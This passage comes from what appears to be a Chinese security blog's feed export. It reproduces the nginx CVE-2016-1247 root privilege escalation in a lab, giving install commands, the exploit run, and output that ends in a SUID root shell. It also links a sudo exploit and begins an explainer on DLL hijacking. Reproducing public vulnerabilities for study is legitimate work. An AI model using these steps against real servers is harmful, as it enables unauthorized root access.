class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x4E3B;&#x8981;&#x6A21;&#x7CCA;&#x70B9;&#xFF0C;&#x662F;&#x5728;SELinux&#x6240;&#x9ED8;&#x8BA4;OPEN&#x5199;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x95EE;&#x9898;&#x3002;&#x4F5C;&#x8005;&#x7684;&#x63CF;&#x8FF0;&#x4E3A;&#xFF1A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">because relabel_tty() (<span class="hljs-keyword">in</span> src/selinux.c) calls open(O_RDWR|O_NONBLOCK)</span><br><span class="line">on his tty and dup2()s it to the <span class="hljs-built_in">command</span><span class="hljs-string">&apos;s stdin, stdout, and stderr.</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h3><p><a href="http://www.openwall.com/lists/oss-security/2017/05/30/16" target="_blank" rel="noopener">http://www.openwall.com/lists/oss-security/2017/05/30/16</a><br><a href="https://www.sudo.ws/alerts/linux_tty.html" target="_blank" rel="noopener">https://www.sudo.ws/alerts/linux_tty.html</a><br><a href="https://github.com/jihadLkmaty218/CVE-2017-1000367/blob/master/sudopwn.c" target="_blank" rel="noopener">https://github.com/jihadLkmaty218/CVE-2017-1000367/blob/master/sudopwn.c</a><br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1453074" target="_blank" rel="noopener">https://bugzilla.redhat.com/show_bug.cgi?id=1453074</a><br><a href="https://github.com/Distrotech/sudo/blob/master/src/ttyname.c" target="_blank" rel="noopener">https://github.com/Distrotech/sudo/blob/master/src/ttyname.c</a><br><a href="http://blog.csdn.net/cybertan/article/details/7596633" target="_blank" rel="noopener">http://blog.csdn.net/cybertan/article/details/7596633</a><br><a href="http://www.jb51.net/LINUXjishu/12713.html" target="_blank" rel="noopener">http://www.jb51.net/LINUXjishu/12713.html</a>    </p><p>openpty<br><a href="http://blog.sina.com.cn/s/blog_8b3afa210100t9v3.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_8b3afa210100t9v3.html</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-1247 nginx提权环境搭建</title>
      <link href="/2017/05/15/CVE-2016-1247/"/>
      <url>/2017/05/15/CVE-2016-1247/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="nginx-&#x63D0;&#x6743;&#x6F0F;&#x6D1E;"><a href="#nginx-&#x63D0;&#x6743;&#x6F0F;&#x6D1E;" class="headerlink" title="nginx &#x63D0;&#x6743;&#x6F0F;&#x6D1E;"></a>nginx &#x63D0;&#x6743;&#x6F0F;&#x6D1E;</h2><p>&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x590D;&#x73B0;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x73AF;&#x5883;&#x642D;&#x5EFA;&#x3002;&#x5177;&#x4F53;&#x5206;&#x6790;&#x89C1;&#x521B;&#x5B87;&#x7684;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x5199;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#x3002;<br><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/</a></p><p>&#x5B89;&#x88C5;&#x8BF4;&#x660E;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 14.04 32bit</span><br><span class="line">nginx 1.4.6-1ubuntu3</span><br></pre></td></tr></tbody></table></figure><br>&#x53C2;&#x8003;&#xFF1A;<br><a href="http://bbs.77169.com/forum.php?mod=viewthread&amp;tid=355577" target="_blank" rel="noopener">http://bbs.77169.com/forum.php?mod=viewthread&amp;tid=355577</a><p></p><h2 id="&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;"><a href="#&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;"></a>&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;</h2><h3 id="&#x9996;&#x5148;&#x5C1D;&#x8BD5;&#x5B89;&#x88C5;nginx-1-4-6-1ubuntu3&#xFF0C;&#x4F46;&#x662F;&#x62A5;&#x9519;&#x3002;"><a href="#&#x9996;&#x5148;&#x5C1D;&#x8BD5;&#x5B89;&#x88C5;nginx-1-4-6-1ubuntu3&#xFF0C;&#x4F46;&#x662F;&#x62A5;&#x9519;&#x3002;" class="headerlink" title="&#x9996;&#x5148;&#x5C1D;&#x8BD5;&#x5B89;&#x88C5;nginx 1.4.6-1ubuntu3&#xFF0C;&#x4F46;&#x662F;&#x62A5;&#x9519;&#x3002;"></a>&#x9996;&#x5148;&#x5C1D;&#x8BD5;&#x5B89;&#x88C5;nginx 1.4.6-1ubuntu3&#xFF0C;&#x4F46;&#x662F;&#x62A5;&#x9519;&#x3002;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:~$ sudo apt-get install nginx=1.4.6-1ubuntu3</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">Some packages could not be installed. This may mean that you have</span><br><span class="line">requested an impossible situation or <span class="hljs-keyword">if</span> you are using the unstable</span><br><span class="line">distribution that some required packages have not yet been created</span><br><span class="line">or been moved out of Incoming.</span><br><span class="line">The following information may <span class="hljs-built_in">help</span> to resolve the situation:</span><br><span class="line"></span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> nginx : Depends: nginx-core (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed or</span><br><span class="line">                  nginx-full (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed or</span><br><span class="line">                  nginx-light (&lt; 1.4.6-1ubuntu3.1~) but 1.4.6-1ubuntu3.7 is to be installed or</span><br><span class="line">                  nginx-extras (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed or</span><br><span class="line">                  nginx-naxsi (&lt; 1.4.6-1ubuntu3.1~) but it is not going to be installed</span><br><span class="line">E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x4E00;&#x4E0B;nginx-full-1-4-6-1ubuntu3"><a href="#&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x4E00;&#x4E0B;nginx-full-1-4-6-1ubuntu3" class="headerlink" title="&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x4E00;&#x4E0B;nginx-full=1.4.6-1ubuntu3"></a>&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x4E00;&#x4E0B;nginx-full=1.4.6-1ubuntu3</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:~$ sudo apt-get install nginx-full=1.4.6-1ubuntu3</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">Some packages could not be installed. This may mean that you have</span><br><span class="line">requested an impossible situation or <span class="hljs-keyword">if</span> you are using the unstable</span><br><span class="line">distribution that some required packages have not yet been created</span><br><span class="line">or been moved out of Incoming.</span><br><span class="line">The following information may <span class="hljs-built_in">help</span> to resolve the situation:</span><br><span class="line"></span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> nginx-full : Depends: nginx-common (= 1.4.6-1ubuntu3) but 1.4.6-1ubuntu3.7 is to be installed</span><br><span class="line">E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;"><a href="#&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;" class="headerlink" title="&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;"></a>&#x56E0;&#x6B64;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx-common=1.4.6-1ubuntu3</span><br><span class="line">sudo apt-get install nginx-full=1.4.6-1ubuntu3</span><br><span class="line">sudo apt-get install nginx=1.4.6-1ubuntu3</span><br></pre></td></tr></tbody></table></figure><br>&#x5B89;&#x88C5;&#x7248;&#x672C;&#x4E3A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:~$ dpkg -l |grep nginx</span><br><span class="line">ii  nginx                                                 1.4.6-1ubuntu3                                      all          small, powerful, scalable web/proxy server</span><br><span class="line">ii  nginx-common                                          1.4.6-1ubuntu3                                      all          small, powerful, scalable web/proxy server - common files</span><br><span class="line">ii  nginx-full                                            1.4.6-1ubuntu3                                      i386         nginx web/proxy server (standard version)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;"><a href="#&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;" class="headerlink" title="&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;"></a>&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:/var/<span class="hljs-built_in">log</span>$ ls -ld ./nginx/</span><br><span class="line">drwxr-x--- 2 www-data adm 4096 May 15 05:41 ./nginx/</span><br></pre></td></tr></tbody></table></figure><br>&#x5C5E;&#x4E8E;www-data&#x7528;&#x6237;&#x7684; &#x8BF4;&#x660E;&#x662F;&#x6CA1;&#x6709;&#x8865;&#x4E01;&#x7684;&#x3002;<p></p><h2 id="&#x8FD0;&#x884C;-amp-&#x590D;&#x73B0;"><a href="#&#x8FD0;&#x884C;-amp-&#x590D;&#x73B0;" class="headerlink" title="&#x8FD0;&#x884C;&amp;&#x590D;&#x73B0;"></a>&#x8FD0;&#x884C;&amp;&#x590D;&#x73B0;</h2><h3 id="nginx&#x8FD0;&#x884C;"><a href="#nginx&#x8FD0;&#x884C;" class="headerlink" title="nginx&#x8FD0;&#x884C;"></a>nginx&#x8FD0;&#x884C;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:~$ sudo nginx</span><br><span class="line">nginx@ubuntu:~$ ps -A |grep nginx</span><br><span class="line">10354 ?        00:00:00 nginx</span><br><span class="line">10355 ?        00:00:00 nginx</span><br><span class="line">10356 ?        00:00:00 nginx</span><br><span class="line">10357 ?        00:00:00 nginx</span><br><span class="line">10358 ?        00:00:00 nginx</span><br></pre></td></tr></tbody></table></figure><br>&#x67E5;&#x770B;log/nginx&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x6587;&#x4EF6;&#x6743;&#x9650;&#x3002;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:/var/<span class="hljs-built_in">log</span>/nginx$ ll</span><br><span class="line">total 8</span><br><span class="line">drwxr-x---  2 www-data adm    4096 May 15 06:04 ./</span><br><span class="line">drwxrwxr-x 15 root     syslog 4096 May 15 05:46 ../</span><br><span class="line">-rw-r--r--  1 root     root      0 May 15 06:04 access.log</span><br><span class="line">-rw-r--r--  1 root     root      0 May 15 06:04 error.log</span><br></pre></td></tr></tbody></table></figure><br>error.log&#x662F;root&#x7528;&#x6237;&#x5E76;&#x4E14;&#x5C5E;&#x4E8E;root&#x7528;&#x6237;&#x7EC4;&#x7684;&#x3002;<br>&#x82E5;&#x662F;&#x5C5E;&#x4E8E;www-data&#x7528;&#x6237;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;kill&#x6389;nginx&#xFF0C;&#x7136;&#x540E;&#x5220;&#x9664;nginx&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF1B;&#x7136;&#x540E;&#x91CD;&#x542F;nginx&#x5373;&#x53EF;&#x3002;<p></p><h3 id="&#x5207;&#x6362;&#x81F3;www-data&#x4E0B;"><a href="#&#x5207;&#x6362;&#x81F3;www-data&#x4E0B;" class="headerlink" title="&#x5207;&#x6362;&#x81F3;www-data&#x4E0B;"></a>&#x5207;&#x6362;&#x81F3;www-data&#x4E0B;</h3><p>&#x56E0;&#x6B64;&#x662F;no-login&#x72B6;&#x6001;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x5207;&#x6362;&#xFF0C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:/var/<span class="hljs-built_in">log</span>/nginx$ gedit /etc/passwd</span><br><span class="line"><span class="hljs-comment">### to /bin/bash</span></span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/bash</span><br></pre></td></tr></tbody></table></figure><br>&#x5207;&#x6362;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nginx@ubuntu:~/Desktop$ su</span><br><span class="line">Password: </span><br><span class="line">root@ubuntu:/home/nginx/Desktop<span class="hljs-comment"># sudo www-data</span></span><br><span class="line">sudo: www-data: <span class="hljs-built_in">command</span> not found</span><br><span class="line">root@ubuntu:/home/nginx/Desktop<span class="hljs-comment"># su www-data</span></span><br><span class="line">www-data@ubuntu:/home/nginx/Desktop$</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x6267;&#x884C;PoC"><a href="#&#x6267;&#x884C;PoC" class="headerlink" title="&#x6267;&#x884C;PoC"></a>&#x6267;&#x884C;PoC</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/home/nginx/Desktop$ ./nginxed-root.sh /var/<span class="hljs-built_in">log</span>/nginx/error.log </span><br><span class="line">[......]</span><br><span class="line">[+] Starting the exploit as: </span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">[+] Compiling the privesc shared library (/tmp/privesclib.c)</span><br><span class="line"></span><br><span class="line">[+] Backdoor/low-priv shell installed at: </span><br><span class="line">-rwxr-xr-x 1 www-data www-data 986672 May 15 06:11 /tmp/nginxrootsh</span><br><span class="line"></span><br><span class="line">[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: </span><br><span class="line">lrwxrwxrwx 1 www-data www-data 18 May 15 06:11 /var/<span class="hljs-built_in">log</span>/nginx/error.log -&gt; /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line">[+] Waiting <span class="hljs-keyword">for</span> Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...</span><br></pre></td></tr></tbody></table></figure><br>&#x5207;&#x6362;&#x81F3;root&#x6743;&#x9650;&#x4E0B;&#xFF0C;&#x5F3A;&#x5236;log&#x56DE;&#x6EDA;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/<span class="hljs-built_in">log</span>/nginx<span class="hljs-comment"># /usr/sbin/logrotate -vf /etc/logrotate.d/nginx</span></span><br></pre></td></tr></tbody></table></figure><br>&#x62FF;&#x5230;root&#x6743;&#x9650;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: </span><br><span class="line">lrwxrwxrwx 1 www-data www-data 18 May 15 06:11 /var/<span class="hljs-built_in">log</span>/nginx/error.log -&gt; /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line">[+] Waiting <span class="hljs-keyword">for</span> Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: </span><br><span class="line">-rw-r--r-- 1 www-data root 19 May 15 06:12 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line">[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line">[+] The /etc/ld.so.preload file now contains: </span><br><span class="line">/tmp/privesclib.so</span><br><span class="line"></span><br><span class="line">[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!</span><br><span class="line">-rwsrwxrwx 1 root root 986672 May 15 06:11 /tmp/nginxrootsh</span><br><span class="line"></span><br><span class="line">[+] Rootshell got assigned root SUID perms at: </span><br><span class="line">-rwsrwxrwx 1 root root 986672 May 15 06:11 /tmp/nginxrootsh</span><br><span class="line"></span><br><span class="line">The server is (N)jinxed ! ;) Got root via Nginx!</span><br><span class="line"></span><br><span class="line">[+] Spawning the rootshell /tmp/nginxrootsh now! </span><br><span class="line"></span><br><span class="line">nginxrootsh-4.3<span class="hljs-comment"># </span></span><br><span class="line">nginxrootsh-4.3<span class="hljs-comment"># </span></span><br><span class="line">nginxrootsh-4.3<span class="hljs-comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x8FDB;&#x4E00;&#x6B65;&#x4E86;&#x89E3;&#x8BE5;&#x6F0F;&#x6D1E;&#x53C2;&#x8003;"><a href="#&#x8FDB;&#x4E00;&#x6B65;&#x4E86;&#x89E3;&#x8BE5;&#x6F0F;&#x6D1E;&#x53C2;&#x8003;" class="headerlink" title="&#x8FDB;&#x4E00;&#x6B65;&#x4E86;&#x89E3;&#x8BE5;&#x6F0F;&#x6D1E;&#x53C2;&#x8003;"></a>&#x8FDB;&#x4E00;&#x6B65;&#x4E86;&#x89E3;&#x8BE5;&#x6F0F;&#x6D1E;&#x53C2;&#x8003;</h2><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a><br><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何快速识别DLL劫持漏洞</title>
      <link href="/2017/05/08/DLL-Hijacking/"/>
      <url>/2017/05/08/DLL-Hijacking/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="DLL&#x52AB;&#x6301;"><a href="#DLL&#x52AB;&#x6301;" class="headerlink" title="DLL&#x52AB;&#x6301;"></a>DLL&#x52AB;&#x6301;</h3><p>DLL&#x52AB;&#x6301;&#x6F0F;&#x6D1E;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x53E4;&#x8001;&#x7684;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;&#x3002;&#x5F53;&#x4E00;&#x4E2A;Windows&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x4F1A;&#x5C1D;&#x8BD5;&#x53BB;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x4E00;&#x4E9B;&#x6240;&#x9700;&#x7684;DLL&#xFF0C;&#x4E0D;&#x540C;&#x7248;&#x672C;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4F1A;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x987A;&#x5E8F;&#x3002;&#x4F18;&#x5148;&#x7EA7;&#x6700;&#x9AD8;&#x7684;&#x90FD;&#x662F;&#x5F53;&#x524D;&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#x8DEF;&#x5F84;&#x4E0B;&#xFF0C;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x5982;&#x7CFB;&#x7EDF;&#x8DEF;&#x5F84;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x80FD;&#x662F;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x3002;</p><h3 id="DLL&#x52AB;&#x6301;&#x7684;&#x5229;&#x7528;"><a href="#DLL&#x52AB;&#x6301;&#x7684;&#x5229;&#x7528;" class="headerlink" title="DLL&#x52AB;&#x6301;&#x7684;&#x5229;&#x7528;"></a>DLL&#x52AB;&#x6301;&#x7684;&#x5229;&#x7528;</h3><p>&#x5F53;&#x80FD;&#x591F;&#x5B9E;&#x73B0;&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#x8DEF;&#x5F84;&#x4E0B;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x5199;&#x7684;&#x8BDD;&#xFF0C;&#x80AF;&#x5B9A;&#x4F1A;&#x5BFC;&#x81F4;DLL&#x52AB;&#x6301;&#x7684;&#x53D1;&#x751F;&#xFF1B;&#x5728;XP SP2&#x4E4B;&#x524D;&#x7684;&#x8BDD;&#xFF0C;&#x5728;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x76EE;&#x5F55;&#xFF08;&#x5373;&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#xFF09;&#x5931;&#x8D25;&#x4E4B;&#x540E;&#xFF0C;&#x5C06;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF0C;&#x5982;&#x679C;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x540C;&#x6837;&#x540D;&#x79F0;&#x7684;DLL&#xFF0C;&#x5C06;&#x4F1A;&#x88AB;&#x52A0;&#x8F7D;&#x3002;&#x7B2C;&#x4E8C;&#x79CD;&#x60C5;&#x51B5;&#x662F;&#xFF0C;&#x5C1D;&#x8BD5;&#x53BB;&#x52A0;&#x8F7D;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;DLL&#xFF0C;&#x8FD9;&#x4E2A;&#x4E3B;&#x8981;&#x662F;&#x56E0;&#x4E3A;&#x7248;&#x672C;&#x66F4;&#x65B0;&#x4E4B;&#x540E;&#xFF0C;&#x6709;&#x4E9B;DLL&#x88AB;&#x5E9F;&#x5F03;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x539F;&#x56E0;&#xFF0C;&#x4F46;&#x662F;&#x52A0;&#x8F7D;&#x90E8;&#x5206;&#x5E76;&#x6CA1;&#x6709;&#x53BB;&#x9664;&#x3002;<br>&#x56E0;&#x6B64;&#x8FD9;&#x90E8;&#x5206;&#x5229;&#x7528;&#x5C31;&#x662F;&#x5C06;&#x7A0B;&#x5E8F;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x5BFC;&#x81F4;&#x4E00;&#x76F4;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;&#x76F4;&#x81F3;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x3002;&#x573A;&#x666F;&#x4E3A;&#xFF1A;&#x82E5;Firefox&#x5B58;&#x5728;DLL&#x52AB;&#x6301;&#x6F0F;&#x6D1E;&#xFF0C;&#x90A3;&#x4E48;&#x8BA9;&#x7528;&#x6237;&#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;HTML&#x6587;&#x4EF6;&#x4EE5;&#x53CA;&#x4E00;&#x4E2A;&#x6076;&#x610F;&#x7684;DLL&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x5904;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;&#xFF0C;&#x90A3;&#x4E48;&#x6253;&#x5F00;HTML&#x6587;&#x4EF6;&#x5C06;&#x5BFC;&#x81F4;&#x6076;&#x610F;DLL&#x7684;&#x6267;&#x884C;&#x3002;</p><h3 id="DLL&#x641C;&#x7D22;&#x987A;&#x5E8F;"><a href="#DLL&#x641C;&#x7D22;&#x987A;&#x5E8F;" class="headerlink" title="DLL&#x641C;&#x7D22;&#x987A;&#x5E8F;"></a>DLL&#x641C;&#x7D22;&#x987A;&#x5E8F;</h3><ol><li>&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5C06;&#x4E0D;&#x518D;&#x8FDB;&#x884C;&#x641C;&#x7D22;</li><li>&#x5982;&#x679C;DLL&#x5728;&#x5DF2;&#x77E5;DLL List&#x4E2D;&#xFF0C;&#x5C06;copy&#x4E00;&#x4EFD;&#x5DF2;&#x77E5;DLL&#xFF0C;&#x4E5F;&#x4E0D;&#x8FDB;&#x884C;&#x641C;&#x7D22;<br>&#x5DF2;&#x77E5;DLL&#x5728;&#x6CE8;&#x518C;&#x8868;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs.</li></ol><p>&#x641C;&#x7D22;&#x987A;&#x5E8F;&#x5C06;&#x4F9D;&#x8D56;&#x4E8E; SafeDllSearchMode &#x662F;&#x5426;&#x6253;&#x5F00;&#x3002;<br>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode<br>&#x4E3A;0&#x8868;&#x793A;disable&#xFF0C;1&#x8868;&#x793A;enable<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Safe DLL search mode is enabled by default starting with Windows XP with Service Pack 2 (SP2).</span><br><span class="line">Safe DLL search mode is enabled by default. To <span class="hljs-built_in">disable</span> this feature, create the </span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode </span><br><span class="line">registry value and <span class="hljs-built_in">set</span> it to 0.</span><br></pre></td></tr></tbody></table></figure><br>&#x5373;&#x80FD;&#x591F;&#x8868;&#x793A;&#x5728;XP 